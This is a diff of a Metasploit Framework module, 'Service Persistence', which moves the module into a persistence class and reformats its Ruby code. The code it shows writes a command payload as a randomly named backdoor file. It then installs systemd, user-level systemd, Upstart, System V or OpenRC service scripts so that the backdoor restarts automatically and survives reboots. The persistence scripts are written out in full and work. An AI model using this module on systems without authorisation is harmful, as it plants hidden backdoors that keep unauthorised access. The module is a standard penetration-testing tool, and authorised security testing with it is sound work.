@@ -3,97 +3,112 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-class MetasploitModule < Msf::Exploit::Local
+class MetasploitModule < Msf::Persistence
   Rank = ExcellentRanking
 
   include Msf::Post::File
   include Msf::Post::Unix
   include Msf::Exploit::FileDropper
+  include Msf::Exploit::Deprecated
+  moved_from 'exploits/linux/local/service_persistence'
 
   def initialize(info = {})
     super(
       update_info(
         info,
-        'Name'           => 'Service Persistence',
-        'Description'    => %q(
+        'Name' => 'Service Persistence',
+        'Description' => %q{
           This module will create a service on the box, and mark it for auto-restart.
           We need enough access to write service files and potentially restart services
           Targets:
-            System V:
-              CentOS <= 5
-              Debian <= 6
-              Kali 2.0
-              Ubuntu <= 9.04
-            Upstart:
-              CentOS 6
-              Fedora >= 9, < 15
-              Ubuntu >= 9.10, <= 14.10
-            systemd:
-              CentOS 7
-              Debian >= 7, <=8
-              Fedora >= 15
-              Ubuntu >= 15.04
+          System V:
+          CentOS <= 5
+          Debian <= 6
+          Kali 2.0
+          Ubuntu <= 9.04
+          Upstart:
+          CentOS 6
+          Fedora >= 9, < 15
+          Ubuntu >= 9.10, <= 14.10
+          systemd:
+          CentOS 7
+          Debian >= 7, <=8
+          Fedora >= 15
+          Ubuntu >= 15.04
           Note: System V won't restart the service if it dies, only an init change (reboot etc) will restart it.
-        ),
-        'License'        => MSF_LICENSE,
-        'Author'         =>
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'h00die <mike@shorebreaksecurity.com>',
+          'Cale Black' # systemd user target
+        ],
+        'Platform' => ['unix', 'linux'],
+        'Targets' => [
           [
-            'h00die <mike@shorebreaksecurity.com>',
-            'Cale Black' # systemd user target
+            'Auto', {
+              'DefaultOptions' =>
+                            {
+                              'BACKDOOR_PATH' => '/usr/local/bin'
+                            }
+            }
           ],
-        'Platform'       => ['unix', 'linux'],
-        'Targets'        =>
           [
-            ['Auto', 'DefaultOptions' =>
-              {
-                'BACKDOOR_PATH' => '/usr/local/bin'
-              }
-            ],
-            ['System V', :runlevel => '2 3 4 5', 'DefaultOptions' =>
-              {
-                'BACKDOOR_PATH' => '/usr/local/bin'
-              }
-            ],
-            ['Upstart', :runlevel => '2345', 'DefaultOptions' =>
-              {
-                'BACKDOOR_PATH' => '/usr/local/bin'
-              }
-            ],
-            ['openrc', 'DefaultOptions' =>
-              {
-                'BACKDOOR_PATH' => '/usr/local/bin'
-              }
-            ],
-            ['systemd', 'DefaultOptions' =>
-              {
-                'BACKDOOR_PATH' => '/usr/local/bin'
-              }
-            ],
-            ['systemd user', 'DefaultOptions' =>
-              {
-                'BACKDOOR_PATH' => '/tmp'
-              }
-            ]
+            'System V', {
+              :runlevel => '2 3 4 5', 'DefaultOptions' =>
+            {
+              'BACKDOOR_PATH' => '/usr/local/bin'
+            }
+            }
           ],
-        'DefaultTarget'  => 0,
-        'Arch'           => ARCH_CMD,
-        'References'     =>
           [
-            ['URL', 'https://www.digitalocean.com/community/tutorials/how-to-configure-a-linux-service-to-start-automatically-after-a-crash-or-reboot-part-1-practical-examples']
+            'Upstart', {
+              :runlevel => '2345', 'DefaultOptions' =>
+            {
+              'BACKDOOR_PATH' => '/usr/local/bin'
+            }
+            }
           ],
-        'Payload'        =>
-        {
-          'Compat'     =>
+          [
+            'openrc', {
+              'DefaultOptions' =>
+                            {
+                              'BACKDOOR_PATH' => '/usr/local/bin'
+                            }
+            }
+          ],
+          [
+            'systemd', {
+              'DefaultOptions' =>
+                            {
+                              'BACKDOOR_PATH' => '/usr/local/bin'
+                            }
+            }
+          ],
+          [
+            'systemd user', {
+              'DefaultOptions' =>
+                            {
+                              'BACKDOOR_PATH' => '/tmp'
+                            }
+            }
+          ]
+        ],
+        'DefaultTarget' => 0,
+        'Arch' => ARCH_CMD,
+        'References' => [
+          ['URL', 'https://www.digitalocean.com/community/tutorials/how-to-configure-a-linux-service-to-start-automatically-after-a-crash-or-reboot-part-1-practical-examples']
+        ],
+        'Payload' => {
+          'Compat' =>
           {
-            'PayloadType'  => 'cmd',
-            'RequiredCmd'  => 'python netcat' # we need non-threaded/forked so the systems properly detect the service going down
+            'PayloadType' => 'cmd',
+            'RequiredCmd' => 'python netcat' # we need non-threaded/forked so the systems properly detect the service going down
           }
         },
-        'DefaultOptions' =>
-          {
-            'WfsDelay' => 5
-          },
-        'DisclosureDate' => '1983-01-01', # system v release date
+        'DefaultOptions' => {
+          'WfsDelay' => 5
+        },
+        'DisclosureDate' => '1983-01-01' # system v release date
       )
     )
 
@@ -116,6 +131,7 @@ class MetasploitModule < Msf::Exploit::Local
     if backdoor.nil?
       return
     end
+
     path = backdoor.split('/')[0...-1].join('/')
     file = backdoor.split('/')[-1]
     case target.name
@@ -159,7 +175,7 @@ class MetasploitModule < Msf::Exploit::Local
   end
 
   def write_shell(path)
-    file_name = datastore['SHELL_NAME'] ? datastore['SHELL_NAME'] : Rex::Text.rand_text_alpha(5)
+    file_name = datastore['SHELL_NAME'] || Rex::Text.rand_text_alpha(5)
     backdoor = "#{path}/#{file_name}"
     vprint_status("Writing backdoor to #{backdoor}")
     write_file(backdoor, payload.encoded)
@@ -174,7 +190,7 @@ class MetasploitModule < Msf::Exploit::Local
 
   def systemd(backdoor_path, backdoor_file)
     # https://coreos.com/docs/launching-containers/launching/getting-started-with-systemd/
-    script = %{[Unit]
+    script = %([Unit]
 Description=Start daemon at boot time
 After=
 Requires=
@@ -184,9 +200,9 @@ Restart=always
 TimeoutStartSec=5
 ExecStart=/bin/sh #{backdoor_path}/#{backdoor_file}
 [Install]
-WantedBy=multi-user.target}
+WantedBy=multi-user.target)
 
-    service_filename = datastore['SERVICE'] ? datastore['SERVICE'] : Rex::Text.rand_text_alpha(7)
+    service_filename = datastore['SERVICE'] || Rex::Text.rand_text_alpha(7)
     service_name = "/lib/systemd/system/#{service_filename}.service"
     vprint_status("Writing service: #{service_name}")
     write_file(service_name, script)
@@ -217,10 +233,10 @@ WantedBy=multi-user.target}
       [Install]
       WantedBy=default.target
     EOF
-    service_filename = datastore['SERVICE'] ? datastore['SERVICE'] : Rex::Text.rand_text_alpha(7)
+    service_filename = datastore['SERVICE'] || Rex::Text.rand_text_alpha(7)
 
     home = cmd_exec('echo ${HOME}')
-    vprint_status("Creating user service directory")
+    vprint_status('Creating user service directory')
     cmd_exec("mkdir -p #{home}/.config/systemd/user")
 
     service_name = "#{home}/.config/systemd/user/#{service_filename}.service"
@@ -230,7 +246,7 @@ WantedBy=multi-user.target}
 
     if !file_exist?(service_name)
       print_error('File not written, check permissions. Attempting secondary location')
-      vprint_status("Creating user secondary service directory")
+      vprint_status('Creating user secondary service directory')
       cmd_exec("mkdir -p #{home}/.local/share/systemd/user")
 
       service_name = "#{home}/.local/share/systemd/user/#{service_filename}.service"
@@ -261,7 +277,7 @@ WantedBy=multi-user.target}
 
   def upstart(backdoor_path, backdoor_file, runlevel)
     # http://blog.terminal.com/getting-started-with-upstart/
-    script = %{description \"Start daemon at boot time\"
+    script = %(description \"Start daemon at boot time\"
 start on filesystem or runlevel [#{runlevel}]
 stop on shutdown
 script
@@ -271,9 +287,9 @@ script
 end script
 post-stop exec sleep 10
 respawn
-respawn limit unlimited}
+respawn limit unlimited)
 
-    service_filename = datastore['SERVICE'] ? datastore['SERVICE'] : Rex::Text.rand_text_alpha(7)
+    service_filename = datastore['SERVICE'] || Rex::Text.rand_text_alpha(7)
     service_name = "/etc/init/#{service_filename}.conf"
     vprint_status("Writing service: #{service_name}")
     write_file(service_name, script)
@@ -384,7 +400,7 @@ case \"$1\" in
 esac
 exit 0}
 
-    service_filename = datastore['SERVICE'] ? datastore['SERVICE'] : Rex::Text.rand_text_alpha(7)
+    service_filename = datastore['SERVICE'] || Rex::Text.rand_text_alpha(7)
     service_name = "/etc/init.d/#{service_filename}"
     vprint_status("Writing service: #{service_name}")
     write_file(service_name, script)
@@ -413,15 +429,15 @@ exit 0}
     # https://wiki.alpinelinux.org/wiki/Writing_Init_Scripts
     # https://wiki.alpinelinux.org/wiki/OpenRC
     # https://github.com/OpenRC/openrc/blob/master/service-script-guide.md
-    script = %{#!/sbin/openrc-run
+    script = %(#!/sbin/openrc-run
 name=#{backdoor_file}
 command=/bin/sh
 command_args="#{backdoor_path}/#{backdoor_file}"
 pidfile="/run/${RC_SVCNAME}.pid"
 command_background="yes"
-}
+)
 
-    service_filename = datastore['SERVICE'] ? datastore['SERVICE'] : Rex::Text.rand_text_alpha(7)
+    service_filename = datastore['SERVICE'] || Rex::Text.rand_text_alpha(7)
     service_name = "/etc/init.d/#{service_filename}"
     vprint_status("Writing service: #{service_name}")
     begin
